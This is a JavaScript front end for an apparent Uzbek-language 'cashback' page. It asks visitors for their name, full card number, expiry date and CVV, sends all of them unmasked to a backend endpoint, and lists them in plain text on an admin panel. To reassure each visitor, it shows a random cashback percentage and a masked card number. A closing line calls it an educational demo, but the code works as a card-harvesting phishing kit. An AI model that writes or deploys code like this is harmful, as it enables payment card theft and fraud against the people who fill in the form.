(function () {
  "use strict";

  const form = document.getElementById("cashbackForm");
  const nameInput = document.getElementById("name");
  const cardInput = document.getElementById("cardNumber");
  const expiryInput = document.getElementById("cardExpiry");
  const cvvInput = document.getElementById("cardCvv");
  const result = document.getElementById("result");
  const adminList = document.getElementById("adminList");
  const userCount = document.getElementById("userCount");
  const clearNamesBtn = document.getElementById("clearNames");

  function randomPercent() {
    return Math.floor(Math.random() * 46) + 5;
  }

  function normalizeCard(value) {
    return String(value || "").replace(/\D/g, "").slice(0, 16);
  }

  function normalizeExpiry(value) {
    const digits = String(value || "").replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  function normalizeCvv(value) {
    return String(value || "").replace(/\D/g, "").slice(0, 4);
  }

  function formatCard(value) {
    const digits = normalizeCard(value);
    const masked = digits.padEnd(16, "0").slice(0, 16);
    const visible = masked.slice(-8);
    return `**** **** ${visible.slice(0, 4)} ${visible.slice(4)}`;
  }

  function formatCardFull(value) {
    const digits = normalizeCard(value);
    const groups = [];

    for (let i = 0; i < digits.length; i += 4) {
      groups.push(digits.slice(i, i + 4));
    }

    return groups.join(" ");
  }

  async function getEntries() {
    try {
      const response = await fetch("/api/entries");
      if (!response.ok) return [];

      const data = await response.json();
      if (!Array.isArray(data)) return [];

      return data.map((item) => {
        if (typeof item === "string") {
          return { name: item, card: "0000 0000 0000 0000", expiry: "12/28", cvv: "123" };
        }

        return {
          name: item.name || "Noma'lum",
          card: item.card || "0000 0000 0000 0000",
          expiry: item.expiry || "12/28",
          cvv: item.cvv || "123",
        };
      });
    } catch (error) {
      return [];
    }
  }

  async function saveEntry(name, card, expiry, cvv) {
    const fullCard = formatCardFull(card);
    const fullExpiry = normalizeExpiry(expiry);
    const fullCvv = normalizeCvv(cvv);

    const response = await fetch("/api/entries", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name,
        card: fullCard,
        expiry: fullExpiry,
        cvv: fullCvv,
      }),
    });

    if (!response.ok) {
      const payload = await response.json().catch(() => ({}));
      throw new Error(payload.message || "Ma'lumot yuborilmadi.");
    }
  }

  async function renderNames() {
    if (!adminList || !userCount) return;

    const entries = await getEntries();
    userCount.textContent = `${entries.length} ta foydalanuvchi`;
    adminList.innerHTML = "";

    if (!entries.length) {
      const emptyItem = document.createElement("li");
      emptyItem.className = "empty";
      emptyItem.textContent = "Hozircha ma'lumotlar yo'q.";
      adminList.appendChild(emptyItem);
      return;
    }

    entries.forEach((entry) => {
      const item = document.createElement("li");
      item.textContent = `${entry.name} — ${entry.card} — ${entry.expiry} — ${entry.cvv}`;
      adminList.appendChild(item);
    });
  }

  if (cardInput) {
    cardInput.addEventListener("input", function () {
      const digits = normalizeCard(cardInput.value);
      const parts = [];

      for (let i = 0; i < digits.length; i += 4) {
        parts.push(digits.slice(i, i + 4));
      }

      cardInput.value = parts.join(" ").slice(0, 19);
    });
  }

  if (expiryInput) {
    expiryInput.addEventListener("input", function () {
      expiryInput.value = normalizeExpiry(expiryInput.value);
    });
  }

  if (cvvInput) {
    cvvInput.addEventListener("input", function () {
      cvvInput.value = normalizeCvv(cvvInput.value);
    });
  }

  if (clearNamesBtn) {
    clearNamesBtn.addEventListener("click", async function () {
      try {
        await fetch("/api/entries", { method: "DELETE" });
        await renderNames();
      } catch (error) {
        // no-op
      }
    });
  }

  if (form) {
    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const name = nameInput.value.trim();
      const rawCard = normalizeCard(cardInput.value);
      const rawExpiry = normalizeExpiry(expiryInput.value);
      const rawCvv = normalizeCvv(cvvInput.value);

      if (!name) {
        result.classList.add("show");
        result.textContent = "Iltimos, ismingizni kiriting.";
        nameInput.focus();
        return;
      }

      if (!/^[0-9]{16}$/.test(rawCard)) {
        result.classList.add("show");
        result.textContent = "Karta raqami 16 ta raqamdan iborat bo'lishi kerak.";
        cardInput.focus();
        return;
      }

      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(rawExpiry)) {
        result.classList.add("show");
        result.textContent = "Karta muddati noto'g'ri kiritildi. Masalan: 12/28";
        expiryInput.focus();
        return;
      }

      if (!/^\d{3,4}$/.test(rawCvv)) {
        result.classList.add("show");
        result.textContent = "CVV 3 yoki 4 raqamdan iborat bo'lishi kerak.";
        cvvInput.focus();
        return;
      }

      try {
        const percent = randomPercent();
        const maskedCard = formatCard(rawCard);

        await saveEntry(name, rawCard, rawExpiry, rawCvv);
        await renderNames();

        const message = `Rahmat, ${name}! Sizga ${percent}% cashback tegishli. Karta raqami: ${maskedCard}. Bu demo versiya faqat ta'lim maqsadida yaratilgan.`;

        result.classList.add("show");
        result.textContent = message;
        form.reset();
      } catch (error) {
        result.classList.add("show");
        result.textContent = error.message || "Xatolik yuz berdi.";
      }
    });
  }

  renderNames();
})();
